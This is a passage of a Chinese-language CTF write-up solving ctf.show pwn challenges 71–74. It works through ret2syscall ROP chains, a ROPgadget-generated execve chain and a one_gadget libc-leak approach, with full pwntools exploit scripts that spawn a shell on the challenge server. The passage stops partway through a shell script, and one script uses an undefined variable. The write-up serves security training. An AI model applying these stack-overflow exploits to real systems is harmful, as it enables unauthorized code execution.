class="line">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</span><br><span class="line">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall</span><br></pre></td></tr></table></figure>

<p>那么首先使用ropgadget找一下可以用的gadgets，凑齐rax,rbx,ecx,edx四个gadgets</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821115409619.png" alt="image-20240821115409619"></p>
<p>eax选择0x080bb196</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821115448509.png" alt="image-20240821115448509"></p>
<p>ebx选择0x0806eb90，一步到位</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821115554342.png" alt="image-20240821115554342"></p>
<p>&#x2F;bin&#x2F;sh的地址为0x080be408（其实用ida也可以看到，使用shift+f12快捷键查看字符串）</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821115831867.png" alt="image-20240821115831867"></p>
<p>int 0x80h的地址为0x08049421</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821122934334.png" alt="image-20240821122934334"></p>
<p>offset为0xffffcfa8-0xffffcf20-0x1c +0x4  &#x3D; 112</p>
<p>发送payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn71&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28310&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 112</span><br><span class="line">eax_ret_addr = 0x080bb196</span><br><span class="line">edx_ecx_ebx_ret_addr = 0x0806eb90</span><br><span class="line">bin_sh_addr = 0x080be408</span><br><span class="line">int_80h_addr = 0x08049421</span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(offset) , eax_ret_addr , 0xb , edx_ecx_ebx_ret_addr , 0x0 , 0x0 , bin_sh_addr , int_80h_addr]) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn72"><a href="#pwn72" class="headerlink" title="pwn72"></a>pwn72</h4><p>tips：接着练ret2syscall，多系统函数调用</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821140952721.png" alt="image-20240821140952721"></p>
<p>跟上题差不多</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821141308026.png" alt="image-20240821141308026"></p>
<p>看了一下字符串，没有&#x2F;bin&#x2F;sh了</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821141401163.png" alt="image-20240821141401163"></p>
<p>我的解题思路：先栈溢出使用gets在可写区域写入&#x2F;bin&#x2F;sh，再使用ret2syscall执行shell</p>
<p>官方的wp：既然能系统调用execve，那为什么不系统调用read呢，所以使用系统调用read读入&#x2F;bin&#x2F;sh即可达到同样的目的</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821143305937.png" alt="image-20240821143305937"></p>
<p>offset &#x3D; 0xffffcfa8 - 0xffffcf70 -0x10 + 0x4 &#x3D; 44</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821143726862.png" alt="image-20240821143726862"></p>
<p>从0x80e9000开始写，gadgets的地址就不赘述了，跟上题的方法是一样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn72&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28163&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 0x28 + 0x4</span><br><span class="line">eax_ret_addr = 0x080bb2c6</span><br><span class="line">edx_ecx_ebx_ret_addr = 0x0806ecb0</span><br><span class="line"># 这里注意无法使用0x08049421地址的int 80h来实现系统调用，可能是因为这里的int 80h是属于另一个函数的，调用完之后会跳到那个函数的程序流里面去，而0x0804f350是单独的一个语句，但是我用ROPgadget找不到0x0804f350，可能是环境的原因？可以用ida的Search -&gt; Sequence of bytes，查找CD 80，可能比较好用一点</span><br><span class="line"># int_0x80h_addr = 0x08049421 </span><br><span class="line">int_0x80h_addr = 0x0804f350</span><br><span class="line">write_addr = 0x080e9000</span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(offset) , eax_ret_addr , 0x3 , edx_ecx_ebx_ret_addr , 0x30 , write_addr , 0x0 , int_0x80h_addr , eax_ret_addr , 0xb , edx_ecx_ebx_ret_addr , 0x0 , 0x0 , write_addr , int_0x80h_addr])</span><br><span class="line">write_content = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(write_content)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn73"><a href="#pwn73" class="headerlink" title="pwn73"></a>pwn73</h4><p>tips：愉快的尝试一下一把梭吧！（真的假的</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821155733104.png" alt="image-20240821155733104"></p>
<p>一如既往</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn73&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28238&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 0x18 + 0x4</span><br><span class="line">eax_ret_addr = 0x080b81c6</span><br><span class="line">edx_ecx_ebx_ret_addr = 0x0806f050</span><br><span class="line"></span><br><span class="line"># 这里使用的int_0x80h_addr是使用ida得到的</span><br><span class="line"></span><br><span class="line">int_0x80h_addr = 0x0806F630</span><br><span class="line"></span><br><span class="line">write_addr = 0x080e9000</span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(offset) , eax_ret_addr , 0x3 , edx_ecx_ebx_ret_addr , 0x30 , write_addr , 0x0 , int_0x80h_addr , eax_ret_addr , 0xb , edx_ecx_ebx_ret_addr , 0x0 , 0x0 , write_addr , int_0x80h_addr])</span><br><span class="line">write_content = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(write_content)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>然而实际上，本题的知识点是如何使用ROPgadget自动生成的脚本一把梭（原来我学了这么久不如一个工具，悲）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary=pwn73 --ropchain</span><br><span class="line"></span><br><span class="line">ROP chain generation</span><br><span class="line">===========================================================</span><br><span class="line"></span><br><span class="line">- Step 1 -- Write-what-where gadgets</span><br><span class="line"></span><br><span class="line">        [+] Gadget found: 0x8051035 mov dword ptr [esi], edi ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">        [+] Gadget found: 0x8048433 pop esi ; ret</span><br><span class="line">        [+] Gadget found: 0x8048480 pop edi ; ret</span><br><span class="line">        [-] Can&#x27;t find the &#x27;xor edi, edi&#x27; gadget. Try with another &#x27;mov [r], r&#x27;</span><br><span class="line"></span><br><span class="line">        [+] Gadget found: 0x80549db mov dword ptr [edx], eax ; ret</span><br><span class="line">        [+] Gadget found: 0x806f02a pop edx ; ret</span><br><span class="line">        [+] Gadget found: 0x80b81c6 pop eax ; ret</span><br><span class="line">        [+] Gadget found: 0x8049303 xor eax, eax ; ret</span><br><span class="line"></span><br><span class="line">- Step 2 -- Init syscall number gadgets</span><br><span class="line"></span><br><span class="line">        [+] Gadget found: 0x8049303 xor eax, eax ; ret</span><br><span class="line">        [+] Gadget found: 0x807a86f inc eax ; ret</span><br><span class="line"></span><br><span class="line">- Step 3 -- Init syscall arguments gadgets</span><br><span class="line"></span><br><span class="line">        [+] Gadget found: 0x80481c9 pop ebx ; ret</span><br><span class="line">        [+] Gadget found: 0x80de955 pop ecx ; ret</span><br><span class="line">        [+] Gadget found: 0x806f02a pop edx ; ret</span><br><span class="line"></span><br><span class="line">- Step 4 -- Syscall gadget</span><br><span class="line"></span><br><span class="line">        [+] Gadget found: 0x806cc25 int 0x80</span><br><span class="line"></span><br><span class="line">- Step 5 -- Build the ROP chain</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line"># execve generated by ROPgadget</span><br><span class="line"></span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"># Padding goes here</span><br><span class="line">p = b&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b81c6) # pop eax ; ret</span><br><span class="line">p += b&#x27;/bin&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b81c6) # pop eax ; ret</span><br><span class="line">p += b&#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08049303) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080de955) # pop ecx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08049303) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806cc25) # int 0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一把梭脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn73&#x27;)</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28238&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 0x18 + 0x4</span><br><span class="line">p = cyclic(offset)</span><br><span class="line"></span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b81c6) # pop eax ; ret</span><br><span class="line">p += b&#x27;/bin&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b81c6) # pop eax ; ret</span><br><span class="line">p += b&#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08049303) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080de955) # pop ecx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08049303) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806cc25) # int 0x80</span><br><span class="line"></span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn74"><a href="#pwn74" class="headerlink" title="pwn74"></a>pwn74</h4><p>tips：好像还没了解过one_gadget</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821200103754.png" alt="image-20240821200103754"></p>
<p>64bit保护全开</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821200703903.png" alt="image-20240821200703903"></p>
<p>反编译代码可以看到输出了printf的地址，然后又可以输入一个v4，然后以v4[0]作为函数名调用</p>
<h5 id="one-gadget补充"><a href="#one-gadget补充" class="headerlink" title="one_gadget补充"></a>one_gadget补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">one_gadget是一种只需要一个地址就能执行shell的方法，只需要满足一些条件即可</span><br><span class="line"></span><br><span class="line">https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib/one-gadget</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install ruby</span><br><span class="line">sudo gem install one_gadget</span><br><span class="line">首先下载one_gadget，one_gadget可以用过libc的版本获取对应的gadget</span><br></pre></td></tr></table></figure>

<p>所以首先我们要通过printf泄露出libc的版本，再通过one_gadget获得与之对应的one_gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28174&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn74&quot;)  </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;this:&quot;)</span><br><span class="line">printf_addr = p.recvuntil(&quot;?&quot;,drop=True)</span><br><span class="line">printf_addr = int(printf_addr,16)</span><br><span class="line">print(printf_addr)</span><br><span class="line">print(hex(printf_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;printf&quot;,printf_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&quot;printf&quot;)</span><br><span class="line"></span><br><span class="line">print(hex(libc_base))</span><br></pre></td></tr></table></figure>

<p>得到符合条件的libc库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0 - libc6_2.7-10ubuntu4_amd64</span><br><span class="line">1 - libc6_2.36-8_i386</span><br><span class="line">2 - libc6_2.27-3ubuntu1.6_amd64</span><br><span class="line">3 - libc6_2.27-3ubuntu1.5_amd64</span><br><span class="line">4 - libc6_2.36-2_i386</span><br><span class="line">5 - libc6_2.36-9_i386</span><br><span class="line">6 - libc6_2.36-4_i386</span><br><span class="line">7 - libc6_2.7-10ubuntu1_amd64</span><br><span class="line">8 - libc6_2.7-10ubuntu5_amd64</span><br><span class="line">9 - libc6-amd64_2.7-10ubuntu3_i386</span><br></pre></td></tr></table></figure>

<p>从<a target="_blank" rel="noopener" href="https://libc.rip/%E4%B8%8B%E8%BD%BDlibc%E5%BA%93%E7%9A%84%E5%B0%8F%E8%84%9A%E6%9C%AC%EF%BC%88https://github.com/zx2023qj/downloadLibc%EF%BC%89%E8%87%AA%E7%94%A899%E6%96%B0">https://libc.rip/下载libc库的小脚本（https://github.com/zx2023qj/downloadLibc）自用99新</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def downloadLibc(symbols, address):</span><br><span class="line">    response = requests.post(url=url, json=&#123;&quot;symbols&quot;: &#123;symbols: address&#125;&#125;)</span><br><span class="line">    response = json.loads(response.text)</span><br><span class="line">    for item in response:</span><br><span class="line">        res = requests.get(url=item[&#x27;download_url&#x27;])</span><br><span class="line">        if res.status_code == 200:</span><br><span class="line">            # 以二进制写入模式打开本地文件</span><br><span class="line">            with open(item[&#x27;id&#x27;] + &#x27;.so&#x27;, &quot;wb&quot;) as file:</span><br><span class="line">                # 分块写入文件内容</span><br><span class="line">                for chunk in res.iter_content(chunk_size=8192):</span><br><span class="line">                    file.write(chunk)</span><br><span class="line">            print(&quot;文件下载成功&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;文件下载失败，状态码：&#123;res.status_code&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def downloadLibcSymbols(symbols, address):</span><br><span class="line">    response = requests.post(url=url, json=&#123;&quot;symbols&quot;: &#123;symbols: address&#125;&#125;)</span><br><span class="line">    response = json.loads(response.text)</span><br><span class="line">    for item in response:</span><br><span class="line">        res = requests.get(url=item[&#x27;symbols_url&#x27;])</span><br><span class="line">        if res.status_code == 200:</span><br><span class="line">            # 以二进制写入模式打开本地文件</span><br><span class="line">            with open(item[&#x27;id&#x27;] + &#x27;.symbols&#x27;, &quot;wb&quot;) as file:</span><br><span class="line">                # 分块写入文件内容</span><br><span class="line">                for chunk in res.iter_content(chunk_size=8192):</span><br><span class="line">                    file.write(chunk)</span><br><span class="line">            print(&quot;文件下载成功&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;文件下载失败，状态码：&#123;res.status_code&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def downloadLibcDeb(symbols, address):</span><br><span class="line">    response = requests.post(url=url, json=&#123;&quot;symbols&quot;: &#123;symbols: address&#125;&#125;)</span><br><span class="line">    response = json.loads(response.text)</span><br><span class="line">    for item in response:</span><br><span class="line">        print(item)</span><br><span class="line">        res = requests.get(url=item[&#x27;libs_url&#x27;])</span><br><span class="line">        if res.status_code == 200:</span><br><span class="line">            # 以二进制写入模式打开本地文件</span><br><span class="line">            with open(item[&#x27;id&#x27;] + &#x27;.deb&#x27;, &quot;wb&quot;) as file:</span><br><span class="line">                # 分块写入文件内容</span><br><span class="line">                for chunk in res.iter_content(chunk_size=8192):</span><br><span class="line">                    file.write(chunk)</span><br><span class="line">            print(&quot;文件下载成功&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;文件下载失败，状态码：&#123;res.status_code&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &quot;https://libc.rip/api/find&quot;</span><br><span class="line">    symbols = input(&quot;symbols:   &quot;)</span><br><span class="line">    address = input(&quot;address(prefix:0x):   &quot;)</span><br><span class="line">    downloadLibc(symbols, address)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来只需要使用one_gadget对每一个可能的libc库进行尝试然后发送地址即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 使用one_gadget遍历当前目录文件并写入文件中</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># 指定要遍历的目录为当前目录</span><br><span class="line">TARGET_DIR=&quot;.&quot;</span><br><span class="line"></span><br><span class="line"># 遍历目录中的所有文件</span><br><span class="line">for file in &quot;$TARGET_DIR&quot;/*; 